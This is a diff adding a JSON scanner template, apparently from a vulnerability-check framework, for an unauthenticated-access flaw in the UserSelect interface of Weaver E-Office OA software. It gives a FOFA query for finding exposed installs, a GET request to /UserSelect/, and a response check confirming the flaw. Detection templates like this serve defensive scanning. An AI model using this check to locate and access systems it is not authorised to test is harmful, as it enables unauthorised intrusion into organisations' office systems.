@@ -1,0 +1,36 @@
+{
+  "product": "泛微 E-Office",
+  "vul_name": "泛微 E-Office UserSelect接口未授权访问",
+  "type": "访问控制",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件。泛微 E-Office 9.5版本存在代码问题漏洞，泛微e-office系统UserSelect接口存在未授权访问漏洞。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-EOffice\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s/8gNj7pPuj8WKY5LUGTRiJw",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/UserSelect/"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "泛微软件"
+        }
+      ]
+    }
+  }
+}
